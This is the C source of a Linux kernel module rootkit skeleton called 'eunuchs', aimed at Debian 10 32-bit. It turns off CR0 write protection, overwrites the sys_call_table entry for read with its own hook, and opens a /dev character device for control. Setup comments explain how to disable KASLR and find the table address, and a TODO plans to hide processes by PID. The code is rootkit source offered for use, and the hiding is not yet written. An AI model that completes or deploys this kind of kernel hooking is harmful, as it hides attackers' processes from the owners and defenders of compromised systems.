/*
 * Targets Debian 10, x86-32bit
 * Kernel 4.19.0
 *
 * From https://www.kernel.org/doc/html/v4.15/admin-guide/kernel-signing.html
 * This module needs to be signed to avoid tainting the kernel.
 * To do so:
 *
 * openssl req -new -nodes -utf8 -sha256 -days 36500 -batch -x509 \
 *      -config x509.genkey -outform PEM -out kernel_key.pem \
 *      -keyout kernel_key.pem
 *
 * scripts/sign-file sha256 kernel-signkey.priv \
 *      kernel-signkey.x509 eunuchs.ko
 *
 * TODO: figure out how to import keys or be able to use a newly generated one
 */

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/unistd.h>
#include <linux/syscalls.h>
#include <linux/device.h>
#include <linux/cdev.h>
#include <linux/types.h>
#include <linux/fs.h>

#include "eunuchs.h"

MODULE_AUTHOR("yes");
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("yes");
MODULE_VERSION("1.0");
MODULE_ALIAS("yes");

/* This is the original value of CR0 */
unsigned original_cr0;

/* BLOCK DEVICE */
static struct class *eunuchs_cl;    // for class descriptor
static int eunuchs_dev_maj_number;  // major number for device

int eunuchs_block_open(struct inode *i, struct file *f)
{
    /* printk("device open()\n"); */
    return 0;
}

int eunuchs_block_release(struct inode *i, struct file *f)
{
    /* printk("device release()\n"); */
    return 0;
}

ssize_t eunuchs_block_read(struct file *f, char __user *buf, size_t len, loff_t *off)
{
    /* printk("device read()\n"); */
    debug("read() got [%s] [%d bytes]\n", buf, len);
    return 0;
}

/**
 * This is our handler for writing to /dev/euchar. This can be written to by
 * `echo 'a' > /dev/euchar` as root.
 *
 * TODO: implement interaction for this to be able to control the lkm options.
 * eg, if buf is "hidep 123", hide process with pid 123.
 *     if buf is "showp 123", show process with pid 123.
 *     etc...
 **/
ssize_t eunuchs_block_write(struct file *f, const char __user *buf, size_t len, loff_t *off)
{
    /* printk("device write()\n"); */
    debug("write() got [%s] [%d bytes]\n", buf, len);
    return len;
}

static struct file_operations eunuchs_fops =
{
    .owner = THIS_MODULE,
    .read = eunuchs_block_read,
    .write = eunuchs_block_write,
    .open = eunuchs_block_open,
    .release = eunuchs_block_release
};

/* Creates a block device so that we can communicate with the lkm from userland */
int eunuchs_dev_init()
{
    if((eunuchs_dev_maj_number = register_chrdev(0, EUNUCHS_DEVICE_NAME, &eunuchs_fops)) < 0)
    {
        debug("register_chrdev() failed\n");
        return -1;
    }

    if((eunuchs_cl = class_create(THIS_MODULE, EUNUCHS_CLASS_NAME)) == NULL)
    {
        debug("class_create() failed\n");
        unregister_chrdev(eunuchs_dev_maj_number, EUNUCHS_DEVICE_NAME);
        return -1;
    }
    if(device_create(eunuchs_cl, NULL, MKDEV(eunuchs_dev_maj_number, 0), NULL, EUNUCHS_DEVICE_NAME) == NULL)
    {
        debug("device_create() failed\n");
        class_destroy(eunuchs_cl);
        unregister_chrdev(eunuchs_dev_maj_number, EUNUCHS_DEVICE_NAME);
        return -1;
    }
    
    debug("device created\n");
    return 0;
}

/* Removes the block device */
int eunuchs_dev_remove()
{
    device_destroy(eunuchs_cl, MKDEV(eunuchs_dev_maj_number, 0));
    class_unregister(eunuchs_cl);
    class_destroy(eunuchs_cl);
    unregister_chrdev(eunuchs_dev_maj_number, EUNUCHS_DEVICE_NAME);
    debug("device removed\n");
    return 0;
}

/*
 * As root...
 * 1. add `nokaslr` to /etc/default/grub in GRUB_CMDLINE_LINUX_DEFAULT
 * 2. execute `update-grub`
 * 3. `grep sys_call_table /boot/System.map-$(uname -r)` to
 *    find the address of the system call table and change the value below
 */
static unsigned long *sct = 0xc167b180;

/* Pointers to save the original functions to. */
static typeof(sys_read) *orig_read;

asmlinkage long eunuchs_read(int fd, char __user *buf, size_t count)
{
    /* printk("reading..\n"); */
    return orig_read(fd, buf, count);
}

/* Twiddles CR0 to enable writing to read-only memory */
void cr0_enable_write()
{
    unsigned cr0 = 0;
    debug("disabling page write protection\n");
    asm volatile("movl %%cr0, %%eax"
                 :"=a"(cr0));
    original_cr0 = cr0;
    cr0 &= 0xfffeffff;
    asm volatile("movl %%eax, %%cr0"
                 :
                 :"a"(cr0));
}

/* Twiddles CR0 to disable writing to read-only memory */
void cr0_disable_write()
{
    debug("restoring write protection on cr0\n");
    asm volatile("movl %%eax, %%cr0"
                 :
                 :"a"(original_cr0));
}

/* Installs our hooks, saving the old system call function pointers */
int eunuchs_hooks_install()
{
    orig_read = (typeof(sys_read) *)sct[__NR_read];
    sct[__NR_read] = (void *)&eunuchs_read;

    return 0;
}

/* Removes our hooks, restoring the original system call function pointers */
void eunuchs_hooks_remove()
{
    sct[__NR_read] = (void *)orig_read;
}

/**
 * Initializes the LKM.
 **/
int eunuchs_init()
{
    debug("init\n");

    /* set up block device */
    if(eunuchs_dev_init() == -1)
        return -1;

    /* install hooks */
    cr0_enable_write();
    eunuchs_hooks_install();
    cr0_disable_write();

    return 0;
}

/**
 * Unloads the LKM.
 **/
void eunuchs_exit()
{
    debug("exit\n");

    cr0_enable_write();
    eunuchs_hooks_remove();
    cr0_disable_write();

    eunuchs_dev_remove();
}

module_init(eunuchs_init);
module_exit(eunuchs_exit);
